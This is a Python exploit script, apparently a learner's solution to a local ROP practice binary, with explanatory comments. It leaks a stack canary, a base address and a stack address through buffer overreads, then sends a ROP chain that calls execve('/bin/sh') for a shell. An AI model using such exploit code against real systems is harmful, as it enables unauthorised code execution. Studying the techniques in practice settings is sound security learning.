# use full tips which I learned from this 
# disas main 
# b main+222
# and continue.
# it will stop before the main end.
# check rax, rdi, rsi, rdx, is set properly.

# pop rdi ; is 1 byte
# if you want to see pop rdi ; ret ;
# in telescope, telescope rdi_gadeget + 1 to 
# check it.

from ptrlib import *

bin_file = './rop'
elf = ELF(bin_file)
proc = Process(bin_file)

# where canary is.
# 0x7ffff7f2f905 <main+000c>      mov    rax, QWORD PTR fs:0x28
# 0x00007fffffffde78│+0x0028: 0xcb59d26f0e0eef00
# when read has called, due to read(STDIN_FILENO, msg, 0x70)
# msg will write from $rsi(second arg of read)
# and then, check for reads $rbp, on top of it, 
# you can find canary same as mains.
# so calculate $rdi - $rbp-8
#               +0x0018 - +0x0030

# over write last 0x00 in canary
# for little endian, x00 at first

def leak_canary():
    paylaod = b'a' * 0x18
    paylaod += b'!'
    proc.sendafter('>> ', paylaod)
    proc.recvuntil('!')
    canary = u64(b'\x00' + proc.recv(7))
    return canary

# becouse __libc_start_main__ call main function,
# use .symbol function to get offset(relative) of main function.
# when __libc_start_main__ call main function,
# it will save the addres to go back to main function.
# when I mean save, addres it's absolute.
# so, plus 88f9 to base addres
# it will be same as absolute addres of main funciton
    # objdump -M intel --disassemble=main rop
    # rop:     file format elf64-x86-64
    # Disassembly of section .init:
    # Disassembly of section .plt:
    # Disassembly of section .plt.got:
    # Disassembly of section .plt.sec:
    # Disassembly of section .text:
    # 00000000000088f9 <main>:
# end then minus offset addres of main from base addres 
# form absolute main addres, we can get base addres
# addr_main:  0x72368b6708f9
# offset_main:  0x88f9
# base_addr: 0x72368b668000

def leak_libc_base_address():
    proc.sendafter('>> ', b'b'*0x37 + b'!')
    proc.recvuntil('b!')
    addr_main = u64(proc.recv(6))
    offset_main = elf.symbol("main")
    base_addr = addr_main - offset_main
    return base_addr

# at first, you have to know every function has a saved rbp
# to move rbp back to where it was.
# so you have to find the saved rbp.
# when you found the saved rbp, you still know that you still
# have your data on your top of the stack.
# if you look up your stack for 0x218, you can find your rsp.
# i know that it's hard to find the saved rbp becouse it's not
# in the order which you learnd. 
# but if your rsp is like around 0x00007ffc6e877358, and 
# if you can finde a addres like 0x00007ffc6e877578, it's most
# likly the saved rbp.
# you can find 0x00007ad58cc1f8f9 these kind of data, but it's 
# just a return address or some thing like that.
# just have a look inside! 
# if it's like a address for instraction, you don't have to care.
# if it's a data that looks like a stack, have a look above.
# if your lucky, youcan find rsp.

def leak_stack_address():
    payload = b"A" * 0x68
    proc.sendafter('>> ', payload)
    proc.recvuntil(payload)
    return u64(proc.recv(6)) - 0x218
    
# when you whant to call a syscall, 
# you need to set a number to rax to tell wich syscall to execute.
# set 59 to rax.
# execve(sys_execve) is number 59, so you need to set it.
# rdi rsi rdx is atached to syscall(rdi, rsi, rdx)

# you can use .getget to get rop gadget.
# but some times the function can't find the gadget. 
# but don't worry. you can use rp++ for manualy find rop gadget.
# so, use it.
    # rp++ -f rop -r 3 --unique | grep "pop rdx ;"
    # 0x8dc2a: pop rax ; pop rdx ; pop rbx ; ret ; (6 found)
# there is pop rbx; whichi we don't need but just pop 0 into it and ignore.
# but dont't forget. it's relative number from libc_base_address,
# so you need to add to it.
    
def make_rop_chain(canary, libc_base_address, stack_top_address):
    input()
    elf.base == libc_base_address

    rax_rdx_rbx_gadget = libc_base_address + next(elf.gadget("pop rax ; pop rdx ; pop rbx ; ret ;"))
    rdi_gadget = libc_base_address + next(elf.gadget("pop rdi ; ret ;"))
    rsi_gadget = libc_base_address + next(elf.gadget("pop rsi ; ret ;"))
    syscall = libc_base_address + next(elf.gadget("syscall"))

    payload = b"/bin/sh\0"
    payload += b"A" * (0x18 - len(payload)) # $rsi + 0x18 == canary_start
    payload += p64(canary)  # canary
    payload += b"B" * 0x8  # saved rbp
    payload += p64(rdi_gadget) # return address
    payload += p64(stack_top_address + 0x10)  # pathname
    payload += p64(rax_rdx_rbx_gadget) # pop rax ; pop rdx ; pop rbx ; ret ;
    payload += p64(59) # for rax
    payload += p64(0) # for rdx
    payload += p64(0) # for rbx which we don't need
    payload += p64(rsi_gadget) # pop rsi ;
    payload += p64(0) # for rsi
    payload += p64(syscall) # call syscall
    assert len(payload) <= 0x70 # read(STDIN_FILENO, msg, 0x70)
    return payload

def attack():
    # leak canary
    canary = leak_canary()
    print("canary: ", hex(canary))

    # leak base addr
    libc_base_address = leak_libc_base_address()
    print("libc_base_address:", hex(libc_base_address))

    # leak stack addr
    stack_top_address = leak_stack_address()
    print("stack_address: ", hex(stack_top_address))

    # make rop chain
    rop_chain = make_rop_chain(canary, libc_base_address, stack_top_address)

    # send
    proc.send(rop_chain)

    # 祈る
    proc.interactive()

if __name__ == '__main__':
   attack()
